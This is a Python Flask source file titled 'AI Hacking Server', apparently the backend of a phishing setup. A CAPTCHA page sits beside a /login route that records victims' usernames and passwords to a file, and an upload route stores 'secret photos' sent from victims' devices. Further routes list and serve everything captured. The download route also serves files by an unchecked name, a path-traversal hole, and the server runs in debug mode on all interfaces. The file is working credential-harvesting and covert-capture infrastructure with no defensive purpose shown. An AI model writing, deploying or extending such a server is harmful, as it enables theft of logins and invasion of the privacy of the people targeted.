from flask import Flask, send_file, request, jsonify
import random
import io
import os
from PIL import Image, ImageDraw, ImageFont
from datetime import datetime

app = Flask(__name__)

PHOTOS_DIR = "captured_photos"
os.makedirs(PHOTOS_DIR, exist_ok=True)

current_code = ""

def generate_captcha(text):
    width, height = 300, 100
    image = Image.new('RGB', (width, height), color='white')
    draw = ImageDraw.Draw(image)
    
    for _ in range(50):
        x = random.randint(0, width)
        y = random.randint(0, height)
        draw.point((x, y), fill='gray')
    
    for _ in range(3):
        x1 = random.randint(0, width)
        y1 = random.randint(0, height)
        x2 = random.randint(0, width)
        y2 = random.randint(0, height)
        draw.line((x1, y1, x2, y2), fill='lightgray', width=1)
    
    try:
        font = ImageFont.truetype("arial.ttf", 55)
    except:
        font = ImageFont.load_default()
    
    total_width = len(text) * 50
    start_x = (width - total_width) // 2
    
    for i, char in enumerate(text):
        x = start_x + i * 50 + random.randint(-2, 2)
        y = (height - 40) // 2 + random.randint(-2, 2)
        draw.text((x, y), char, fill='black', font=font)
    
    return image

@app.route('/')
def home():
    return """
    <h1>AI Hacking Server</h1>
    <ul>
        <li><a href='/captcha'>View CAPTCHA</a></li>
        <li><a href='/captured_photos'>View Captured Photos</a></li>
        <li><a href='/credentials'>View Credentials</a></li>
    </ul>
    """

@app.route('/captcha')
def get_captcha():
    global current_code
    current_code = str(random.randint(1000, 9999))
    print(f"[CAPTCHA] Current code: {current_code}")
    img = generate_captcha(current_code)
    img_io = io.BytesIO()
    img.save(img_io, 'PNG')
    img_io.seek(0)
    return send_file(img_io, mimetype='image/png')

@app.route('/verify', methods=['POST'])
def verify():
    user_input = request.json.get('code', '')
    if user_input == current_code:
        return jsonify({'success': True})
    else:
        return jsonify({'success': False})

@app.route('/login', methods=['POST'])
def login_capture():
    username = request.form.get('username', 'N/A')
    password = request.form.get('password', 'N/A')
    
    print("\n" + "=" * 50)
    print("[LOGIN CREDENTIALS CAPTURED]")
    print("=" * 50)
    print(f"Username: {username}")
    print(f"Password: {password}")
    print("=" * 50)
    
    with open("captured_credentials.txt", "a") as f:
        f.write(f"[{datetime.now()}] Username: {username}, Password: {password}\n")
    
    return jsonify({"status": "success"})

@app.route('/upload_photo', methods=['POST'])
def upload_photo():
    if 'image' not in request.files:
        return "No image", 400
    
    image_file = request.files['image']
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"secret_photo_{timestamp}.jpg"
    filepath = os.path.join(PHOTOS_DIR, filename)
    
    image_file.save(filepath)
    
    print("\n" + "=" * 50)
    print("[SECRET PHOTO CAPTURED]")
    print("=" * 50)
    print(f"Saved: {filepath}")
    print(f"Time: {datetime.now()}")
    print("=" * 50)
    
    return "OK", 200

@app.route('/captured_photos')
def list_photos():
    photos = os.listdir(PHOTOS_DIR)
    html = "<h2>Captured Photos</h2><ul>"
    for photo in photos:
        html += f"<li><a href='/download_photo/{photo}'>{photo}</a></li>"
    html += "</ul>"
    return html

@app.route('/download_photo/<filename>')
def download_photo(filename):
    return send_file(os.path.join(PHOTOS_DIR, filename))

@app.route('/credentials')
def view_credentials():
    try:
        with open("captured_credentials.txt", "r") as f:
            content = f.read()
        return f"<pre>{content}</pre>"
    except:
        return "No credentials captured yet."

if __name__ == '__main__':
    import socket
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    
    print("=" * 50)
    print("AI Hacking Server")
    print(f"Running on: http://{local_ip}:5000")
    print("=" * 50)
    
    app.run(host='0.0.0.0', port=5000, debug=True)